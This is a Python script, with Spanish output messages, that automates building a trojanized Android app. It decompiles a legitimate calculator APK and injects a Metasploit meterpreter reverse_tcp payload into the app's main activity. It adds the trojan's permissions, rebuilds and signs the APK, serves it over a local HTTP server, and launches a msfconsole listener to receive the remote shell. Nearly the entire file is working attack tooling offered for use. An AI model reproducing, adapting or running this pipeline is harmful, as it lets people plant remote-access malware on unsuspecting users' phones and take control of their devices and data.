#!/usr/bin/env python3

import os
import subprocess
import sys

def clonarRepo(repoUrl, rutaDispositivo):
    if not os.path.exists(rutaDispositivo):

        print(f"\nClonando repositorio {repoUrl} en la ruta {rutaDispositivo}.\n")
        os.makedirs(rutaDispositivo)
        resultClonRepo = subprocess.run(["git", "clone", repoUrl, rutaDispositivo])

        if resultClonRepo.returncode == 0:
            print("\nRepositorio clonado con éxito.\n")
        else:
            print("\nError al clonar el repositorio.\n")
            sys.exit(1)

def configureApktool(originRoute, destinantionRoute):
    if not os.path.exists(destinantionRoute):
        print(f"\nCopiando apktool y estableciando permisos...")
        resultCopyApktool = subprocess.run(["cp", originRoute, destinantionRoute])
        resultGivePermissions = subprocess.run(["chmod", "+x", destinantionRoute])

        if resultCopyApktool.returncode == 0 and resultGivePermissions.returncode == 0:
            print("apktool configurado con éxito.")
        else:
            print("Error al configurar apktool.")
            sys.exit(1)

def configureApktoolJar(originRouteJar, destinantionRouteJar):
    if not os.path.exists(destinantionRouteJar):
        print(f"\nCopiando apktool.jar y estableciando permisos...")
        resultCopyApktoolJar = subprocess.run(["cp", originRouteJar, destinantionRouteJar])
        resultGivePermissionsJar = subprocess.run(["chmod", "+x", destinantionRouteJar])

        if resultCopyApktoolJar.returncode == 0 and resultGivePermissionsJar.returncode == 0:
            print("apktool.jar configurado con éxito.")
        else:
            print("Error al configurar apktool.jar")
            sys.exit(1)

def unzipCompressedApk(apkDecompressed,apkCompressed):
    if not os.path.exists(apkDecompressed):
        print(f"\n\nDescomprimiendo APK.zip\n")

        os.chdir("/home/kali/Documents/APKmobile")
        resultUnzipCompressedApk = subprocess.run(["unzip", apkCompressed])

        if resultUnzipCompressedApk.returncode == 0:
            print("APK.zip descomprimido con éxito.")
        else:
            print("Error al descomprimir el APK.zip.")
            sys.exit(1)

def decompileApk(originalApk, decompiledApk):
    if not os.path.exists(decompiledApk):
        print(f"\n\nDecompilando APK con apktool...\n")

        resultDecompileApk = subprocess.run(["apktool", "d", originalApk, "-o", decompiledApk])

        if resultDecompileApk.returncode == 0:
            print(f"\nApk {originalApk} decompilado con éxito.")
        else:
            print(f"\nError al decompilar el APK {originalApk}.")
            sys.exit(1)

def msfvenomGenerateApk(trojanApkRoute):
    if not os.path.exists(trojanApkRoute):
        print("Generando troyano...\n")

        os.chdir("/home/kali/Documents/APKmobile")
        localIP = input("Introduce tu IP local:")
        localPort = input("Introduce un puerto:")
        print("\n")

        comando = (
            f"msfvenom -p android/meterpreter/reverse_tcp "
            f"lhost={localIP} lport={localPort} R > trojan.apk"
        )

        msfvenomGenerateApkResult = subprocess.run(comando, shell=True)
        if msfvenomGenerateApkResult.returncode == 0:
            print("Payload generado con éxito.")
        else:
            print("Error al generar el payload.")

def evilApkDecompile(compiledEvilApk, decompiledEvilApk):
    if not os.path.exists(decompiledEvilApk):
        print(f"Decompilando troyano.apk\n")

        evilApkDecompileResult = subprocess.run(["apktool", "d", compiledEvilApk, "-o", decompiledEvilApk])

        if evilApkDecompileResult.returncode == 0:
            print(f"\nApk maligno {compiledEvilApk} decompilado con éxito.")
        else:
            print(f"\nError al decompilar el APK maligno {compiledEvilApk}.")
            sys.exit(1)

def copyEvilSmali(routeEvilSmali):
    if not os.path.exists(routeEvilSmali):
        print(f"\nCopiando ficheros Smali malignos a APK original.")
        os.chdir("/home/kali/Documents/APKmobile/trojan/")
        os.system("tar -cf - ./smali | (cd /home/kali/Documents/APKmobile/com.victormugo.calculator_2014-10-27/smali/; tar -xpf -)")

def apkMain():
    os.chdir("/home/kali/Documents/APKmobile/com.victormugo.calculator_2014-10-27/")
    comandoEgrep = (
        f"grep -B2 'MAIN' AndroidManifest.xml | awk -F '\"' '{{print $4}}'"
    )

    resultComandoEgrep = subprocess.run(comandoEgrep, shell=True, capture_output=True)
    salida_decodificada = resultComandoEgrep.stdout.decode("utf-8")
    #print(f"{salida_decodificada}")

    rutaSmali = "/home/kali/Documents/APKmobile/com.victormugo.calculator_2014-10-27/smali/"
    os.chdir(rutaSmali)

    rutaMain = salida_decodificada.replace(".","/").replace("\n","")
    formatSmali=".smali"
    newRouteMain = f"{rutaSmali}{rutaMain}{formatSmali}"
    #print(newRouteMain)

    with open(newRouteMain ,"r+") as archivo:
        lineas=archivo.readlines()
        lineas.insert(85, "\n")
        lineas.insert(85, "invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V")
        archivo.seek(0)
        archivo.writelines(lineas)
        archivo.close

def usesPermission(routeTrojanAndroidManifest):
        resultTrojanPermissions = subprocess.run(["cat", routeTrojanAndroidManifest], stdout=subprocess.PIPE, text=True)
        grep_result = subprocess.run(["grep", "uses-permission"], input=resultTrojanPermissions.stdout, stdout=subprocess.PIPE, text=True)

        #print(grep_result)
        permissionsArray = [line.lstrip() for line in grep_result.stdout.strip().split('\n')]
        print(permissionsArray)
        print(f"\n")

        fileAndroidManifest = "/home/kali/Documents/APKmobile/com.victormugo.calculator_2014-10-27/AndroidManifest.xml"

        with open(fileAndroidManifest, "r") as manifest_file:
                lines = manifest_file.readlines()
        last_permission_line_index = max((i for i, line in enumerate(lines) if '<uses-permission' in line), default=-1)
        lines.insert(last_permission_line_index + 1, '\n'.join(permissionsArray) + '\n')

        with open(fileAndroidManifest, 'w') as manifest_file:
                manifest_file.writelines(lines)

        #print(last_permission_line_index)

def compileModifyApk(routeApkModified, fileApkModified):
    os.chdir(routeApkModified)
    resultCompileNewApk = subprocess.run(["apktool", "b", fileApkModified])

    if resultCompileNewApk.returncode == 0:
        print(f"\nApk modificado {fileApkModified} compilado con éxito.\n")
    else:
        print(f"\nError al decompilar el APK maligno {fileApkModified}.")
        sys.exit(1)

def signNewApk(fileNewApkCompiled, fileSignerApk):
    resultSignNewApk = subprocess.run(["java", "-jar", fileSignerApk, "--apks", fileNewApkCompiled])

    if resultSignNewApk.returncode == 0:
        print(f"\nNuevo Apk {fileNewApkCompiled} firmado con éxito.")
    else:
        print(f"\nError al firmar el nuevo APK {fileNewApkCompiled}.")
        sys.exit(1)

def pythonServer(directoryApkSigned):
    if os.path.exists(directoryApkSigned):
        printMessage = "\nPython server abierto en el puerto 444.\n"
        os.chdir(directoryApkSigned)
        os.system(f"gnome-terminal -- bash -c 'echo \"{printMessage}\";python -m http.server 444; bash'")

def startMsfvenom():
    print(f"\nInstala el APK en el móvil.")
    print(f"Una vez instalado ingresa la IP y el puerto.\n")

    localIP = input("Introduce tu IP local: ")
    lport = input("Introduce un puerto local: ")
    msfvenom_script = "msfconsole -q -x 'use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set lhost {localIP};set lport {lport}; exploit'"

    subprocess.run(['gnome-terminal', '--', 'bash', '-c', msfvenom_script])

def main():
    try:
        repoUrl = "https://github.com/h3r0e/APKmobile"
        rutaDispositivo = "/home/kali/Documents/APKmobile"
        clonarRepo(repoUrl, rutaDispositivo)

        originRoute = "/home/kali/Documents/APKmobile/apktool"
        destinantionRoute = "/usr/local/bin/apktool"
        configureApktool(originRoute, destinantionRoute)

        originRouteJar = "/home/kali/Documents/APKmobile/apktool.jar"
        destinantionRouteJar = "/usr/local/bin/apktool.jar"
        configureApktoolJar(originRouteJar, destinantionRouteJar)

        apkDecompressed = "/home/kali/Documents/APKmobile/com.victormugo.calculator_2014-10-27.apk"
        apkCompressed = "/home/kali/Documents/APKmobile/com.victormugo.calculator_2014-10-27.apk.zip"
        unzipCompressedApk(apkDecompressed, apkCompressed)

        originalApk = "/home/kali/Documents/APKmobile/com.victormugo.calculator_2014-10-27.apk"
        decompiledApk = "/home/kali/Documents/APKmobile/com.victormugo.calculator_2014-10-27"
        decompileApk(originalApk, decompiledApk)

        trojanApkRoute = "/home/kali/Documents/APKmobile/trojan.apk"
        msfvenomGenerateApk(trojanApkRoute)

        compiledEvilApk = "/home/kali/Documents/APKmobile/trojan.apk"
        decompiledEvilApk = "/home/kali/Documents/APKmobile/trojan"
        evilApkDecompile(compiledEvilApk, decompiledEvilApk)

        routeEvilSmali = "/home/kali/Documents/APKmobile/com.victormugo.calculator_2014-10-27/smali/smali/com/metasploit"
        copyEvilSmali(routeEvilSmali)

        apkMain()

        routeTrojanAndroidManifest = "/home/kali/Documents/APKmobile/trojan/AndroidManifest.xml"
        usesPermission(routeTrojanAndroidManifest)

        routeApkModified = "/home/kali/Documents/APKmobile"
        fileApkModified = "/home/kali/Documents/APKmobile/com.victormugo.calculator_2014-10-27"
        compileModifyApk(routeApkModified, fileApkModified)

        fileNewApkCompiled = "/home/kali/Documents/APKmobile/com.victormugo.calculator_2014-10-27/dist/com.victormugo.calculator_2014-10-27.apk"
        fileSignerApk = "/home/kali/Documents/APKmobile/uber-apk-signer-1.3.0.jar"
        signNewApk(fileNewApkCompiled, fileSignerApk)

        directoryApkSigned = "/home/kali/Documents/APKmobile/com.victormugo.calculator_2014-10-27/dist/"
        pythonServer(directoryApkSigned)

        startMsfvenom()

    except Exception as error:
        print(f"Error: {error}")
        sys.exit(1)

if __name__ == "__main__":
    main()